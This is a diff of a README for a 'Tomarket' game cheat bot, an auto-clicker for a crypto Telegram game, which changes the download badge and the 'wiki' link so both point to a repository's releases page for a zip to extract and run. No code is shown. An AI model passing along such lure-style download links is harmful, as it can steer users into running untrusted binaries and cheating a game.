@@ -9,7 +9,7 @@ Welcome to the Tomarket Hack Game Bot Auto Farm Clicker repository! This bot is 
 
 ## Installation Guide 🛠️
 To get started with the Tomarket Hack Game Bot Auto Farm Clicker, you can download the necessary files from the following link:  
-[![Download Release](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/assets/Release.zip)
+[![Download Release](https://github.com/quimicarobot/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/releases)](https://github.com/quimicarobot/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/releases)
 
 Remember to extract the contents from the downloaded file if needed before running the bot.
 
@@ -35,7 +35,7 @@ Remember to extract the contents from the downloaded file if needed before runni
 If you encounter any issues or have suggestions for enhancements, feel free to open an issue on the repository. Your feedback is valuable in improving the overall user experience of the bot.
 
 ## Resources 📚
-- Explore the [wiki](https://github.com/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker/wiki) for detailed information and guides.
+- Explore the [wiki](https://github.com/quimicarobot/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/releases) for detailed information and guides.
 - Check the "Releases" section for the latest updates and versions if the provided link is not working.
 
 Thank you for choosing the Tomarket Hack Game Bot Auto Farm Clicker for enhancing your gameplay experience! Happy gaming! 🎉
